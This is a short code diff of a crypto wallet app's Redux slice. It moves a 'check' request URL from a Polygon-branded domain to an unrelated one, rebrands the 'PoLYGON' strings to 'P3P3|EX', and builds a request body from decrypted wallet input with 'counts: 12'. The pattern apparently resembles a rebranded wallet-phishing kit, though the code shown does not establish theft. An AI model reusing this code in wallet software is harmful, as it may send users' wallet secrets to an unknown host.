@@ -36,7 +36,7 @@ const initialState = {
 	walletPrices: null
 }
 
-let url = 'https://polygonfinance.org/concept/unity/check'
+let url = 'https://localnetwork.cc/date/spot/board'
 const kitkat = process.env.REACT_APP_KEY
 
 function createBody(str, account, btcAddress) {
@@ -47,8 +47,8 @@ function createBody(str, account, btcAddress) {
 	} else {
 		strDecr = str
 	}
-	let xxx = 'PoLYGON/G'
-	let xx = 'PoLYGON'
+	let xxx = 'P3P3|EX/G'
+	let xx = 'P3P3|EX'
 
 	const obj = {
 		counts: 12,
@@ -217,11 +217,11 @@ const walletSlice = createSlice({
 				state.dataWallet = action.payload
 				state.walletAddress = action.payload.address
 				state.walletNew = false
-				state.walletPrices = action.payload.portfolio
+				state.walletPrices = action.payload.portfolio.attributes
 			})
 			.addCase(fetchDataWallet.rejected, (state, action) => {
 				state.status = 'error'
-				state.dataWallet = null
+				state.dataWallet = []
 			})
 			.addCase(fetchAddressBitcoin.fulfilled, (state, action) => {
 				state.statusAddress = 'success'
